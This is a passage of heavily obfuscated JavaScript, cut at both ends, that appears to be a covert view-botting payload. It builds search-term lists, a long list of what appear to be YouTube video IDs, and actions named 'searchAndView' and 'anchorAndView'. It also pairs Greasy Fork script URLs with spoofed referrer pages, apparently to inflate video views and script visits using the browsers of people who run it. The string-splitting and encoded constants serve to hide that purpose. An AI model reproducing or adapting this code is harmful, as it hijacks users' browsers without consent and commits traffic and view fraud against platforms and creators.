searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + X(0x3) + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x22e0 + 0x28d * -0xb + 0x3ef9)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x19 * 0xa3 + -0xd4e * -0x1 + -0x1d2f)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x3 * 0x25 + 0x11 * -0x21d + -0x1 * -0x245f);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    W(0x16) + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + Y(0xe, 'XOX4') + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x5, 'XcH%') + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + X(0x11) + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x14, 'VB$]') + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0xf, 'q(Ev') + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
